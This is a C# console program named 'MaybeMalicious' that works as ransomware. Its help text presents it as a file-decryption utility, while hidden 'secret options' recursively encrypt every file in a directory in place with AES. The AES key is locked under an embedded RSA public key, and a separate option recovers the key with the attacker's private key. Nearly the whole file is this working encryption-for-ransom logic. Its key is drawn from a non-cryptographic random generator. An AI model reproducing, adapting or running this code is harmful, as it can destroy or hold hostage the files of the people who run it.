using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;

namespace MaybeMalicious
{
    class Program
    {
        public static string rsaPubKey = "MIIBCgKCAQEAyIW7MeJh/YLg45BZROKdBRl7kd3rbf1N+/vDyfluPbgZSfzz4zJ9qmVUGQhGbTBA2VuHkWv8ePXT7e6mWK0nYbePgLvoOfI7IC94EhKNk3Dw3DkKmYhsWA+e0M26RYdzIJsxmZWRBAGOL32MJnu3D+AaciG5+ZjWh+RcPKv7LEsxPWAIEMUpiFJLMnHfmt8ljlZISdNFHZ4n/mekQ6BiLNSlAAh1Nh0ggWAFqSrl/7vsAFnUIxY5UNVsOqU/Sjvsy+mNkyPbZC9QAUNj3QudRBi/zWR5mokIObZ+woGx6/7Nvm3chECgIYhpKOLktA6eSQjYx3X2V4FPW7dgp32BAQIDAQAB";

        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                PrintHelp();
                return;
            }

            Dictionary<string, string> kwargs = ProcessArgs(args);
            using AesCryptoServiceProvider aes = new AesCryptoServiceProvider();

            if (kwargs["action"] == "encrypt")
            {
                if (!kwargs.ContainsKey("target"))
                {
                    Console.WriteLine("Attempted to encrypt a file without specifying a target!");
                    PrintHelp();
                    return;
                }
                
                Random r = new Random();
                byte[] key = new byte[32];
                r.NextBytes(key);
                aes.Key = key;

                using RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                byte[] rsaPubKeyBytes = Convert.FromBase64String(rsaPubKey);
                rsa.ImportRSAPublicKey(rsaPubKeyBytes, out int _);

                SaveKey(aes.Key, rsa);

                if (kwargs["type"] == "file")
                {
                    EncryptFile(kwargs["target"], aes);
                }
                else if (kwargs["type"] == "directory")
                {
                    EncryptDirectory(kwargs["target"], aes);
                }
            }
            else if (kwargs["action"] == "decrypt")
            {
                if (!(kwargs.ContainsKey("target") && kwargs.ContainsKey("key")))
                {
                    Console.WriteLine("Attempted decryption without a target or a key!");
                    PrintHelp();
                    return;
                }
                
                aes.Key = Convert.FromBase64String(kwargs["key"]);

                if (kwargs["type"] == "file")
                {
                    DecryptFile(kwargs["target"], aes);
                }
                else if (kwargs["type"] == "directory")
                {
                    DecryptDirectory(kwargs["target"], aes);
                }
            }
            else if (kwargs["action"] == "key")
            {
                if (!(kwargs.ContainsKey("target") && kwargs.ContainsKey("key")))
                {
                    Console.WriteLine("Attempted key recovery without a target or a key!");
                    PrintHelp();
                    return;
                }

                using RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                byte[] rsaPrivKeyBytes = Convert.FromBase64String(kwargs["key"]);
                rsa.ImportRSAPrivateKey(rsaPrivKeyBytes, out int _);
                RecoverKey(kwargs["target"], rsa);
            }
            else
            {
                Console.WriteLine("Unknown action. Exiting!");
                return;
            }
        }

        private static void SaveKey(byte[] key, RSACryptoServiceProvider rsa)
        {
            string path = new Uri(System.Reflection.Assembly.GetExecutingAssembly().CodeBase).AbsolutePath;
            string filePath = Path.Combine(Path.GetDirectoryName(path), "key.enc");
            byte[] cryptoText = rsa.Encrypt(key, false);

            int c = 0;
            while (File.Exists(filePath))
            {
                c++;
                filePath = Path.Combine(Path.GetDirectoryName(path), $"key{c}.enc");
            }

            using FileStream file = new FileStream(filePath, FileMode.Create);
            file.Write(cryptoText);
        }

        private static void RecoverKey(string keyPath, RSACryptoServiceProvider rsa)
        {
            if (!File.Exists(keyPath))
            {
                Console.WriteLine("Cannot find key file to recover at " + keyPath);
                return;
            }

            using FileStream keyFile = new FileStream(keyPath, FileMode.Open);
            byte[] encKey = new byte[keyFile.Length];
            int bytesRead = 0;
            while(bytesRead < keyFile.Length)
            {
                bytesRead += keyFile.Read(encKey);
            }

            byte[] key = rsa.Decrypt(encKey, false);
            string keyText = Convert.ToBase64String(key);
            Console.WriteLine("Decrypted key: " + keyText);

            string outKeyPath = keyPath + ".dec";
            int c = 0;
            while (File.Exists(outKeyPath))
            {
                c++;
                outKeyPath = keyPath + $"{c}.dec";
            }
            File.WriteAllText(outKeyPath, keyText);
        }

        private static Dictionary<string, string> ProcessArgs(string[] args)
        {
            Dictionary<string, string> kwargs = new Dictionary<string, string>
            {
                ["action"] = "decrypt"
            };
            for (int i = 0; i < args.Length; i++)
            {
                string arg = args[i];
                string value = null;
                if (arg.Contains('='))
                {
                    value = arg.Split('=')[1];
                    arg = arg.Split('=')[0];
                }
                else if (i + 1 < args.Length && args[i + 1][0] != '-')
                {
                    // The next index of args exists and is not a parameter, therefore it should be treated as a value
                    i++;
                    value = args[i];
                }
                switch (arg)
                {
                    case "-f":
                        kwargs["target"] = value ?? throw new ArgumentException("Detected -f, but no file name was supplied!");
                        kwargs["type"] = "file";
                        break;
                    case "-d":
                        kwargs["target"] = value ?? throw new ArgumentException("Detected -d, but no directory path was supplied!");
                        kwargs["type"] = "directory";
                        break;
                    case "--key":
                        kwargs["key"] = value ?? throw new ArgumentException("Detected --key, but no key was provided!");
                        break;
                    case "--keyfile":
                        kwargs["key"] = FetchKeyFromFile(value);
                        break;
                    case "-e":
                        kwargs["action"] = "encrypt";
                        break;
                    case "-r":
                        kwargs["action"] = "key";
                        break;
                    default:
                        Console.WriteLine($"Ignoring unknown parameter \"{arg}\"");
                        break;
                }
            }
            return kwargs;
        }

        private static void PrintHelp()
        {
            Console.WriteLine("Expected syntax: MaybeMalicious [-f | -d] <path> [--key=<key> | --keyfile=<key_file>]");
            Console.WriteLine();
            Console.WriteLine("--key       to supply the private key to decrypt your files.");
            Console.WriteLine("--keyfile   to supply the path to a file that contains the private key.");
            Console.WriteLine("-f          to decrypt the specified file using the provided key.");
            Console.WriteLine("-d          to decrypt all the files in the specified directory.");
            Console.WriteLine();
            Console.WriteLine("Secret options: -e -r");
            Console.WriteLine("One of these will encrypt your files!");
        }

        private static string FetchKeyFromFile(string filePath)
        {
            if (!File.Exists(filePath))
            {
                throw new ArgumentException("Cannot find key file at " + filePath);
            }

            using FileStream file = new FileStream(filePath, FileMode.Open);
            using StreamReader read = new StreamReader(file);

            return read.ReadToEnd();
        }

        private static void EncryptDirectory(string path, AesCryptoServiceProvider aes)
        {
            if (!Directory.Exists(path))
            {
                Console.WriteLine("Cannot find directory " + path);
                return;
            }
            string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
            foreach(string file in files)
            {
                EncryptFile(file, aes);
            }
        }

        private static void EncryptFile(string filePath, AesCryptoServiceProvider aes)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine("Could not find file: " + filePath);
                return;
            }

            aes.GenerateIV();

            // Generate temporary file
            string tempFile = Path.GetTempFileName();
            File.Copy(filePath, tempFile, true);

            using FileStream file = new FileStream(tempFile, FileMode.Open);
            using FileStream newFile = new FileStream(filePath, FileMode.Truncate);
            // Write IV to file so it can be decrypted later
            newFile.Write(aes.IV, 0, aes.IV.Length);
            using CryptoStream crypto = new CryptoStream(newFile, aes.CreateEncryptor(), CryptoStreamMode.Write);
            file.CopyTo(crypto);
            crypto.FlushFinalBlock();

            Console.WriteLine("Encrypted file " + filePath);
            file.Close();
            File.Delete(tempFile);
        }

        private static void DecryptDirectory(string path, AesCryptoServiceProvider aes)
        {
            if (!Directory.Exists(path))
            {
                Console.WriteLine("Cannot find directory " + path);
                return;
            }
            string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
            foreach (string file in files)
            {
                DecryptFile(file, aes);
            }
        }

        private static void DecryptFile(string filePath, AesCryptoServiceProvider aes)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine("Cannot find encrypted file " + filePath);
                return;
            }
            // Create temporary file to work with
            string tmpFile = Path.GetTempFileName();
            File.Copy(filePath, tmpFile, true);

            using FileStream encFile = new FileStream(tmpFile, FileMode.Open);
            // Load IV from encrypted file
            byte[] iv = new byte[aes.IV.Length];
            encFile.Read(iv, 0, aes.IV.Length);
            aes.IV = iv;
            encFile.Seek(aes.IV.Length, SeekOrigin.Begin);
            // Create crypto stream and copy decrypted file to original file
            using CryptoStream crypto = new CryptoStream(encFile, aes.CreateDecryptor(), CryptoStreamMode.Read);
            using FileStream decFile = new FileStream(filePath, FileMode.Truncate);
            crypto.CopyTo(decFile);
            crypto.Close();
            encFile.Close();
            File.Delete(tmpFile);
        }
    }
}
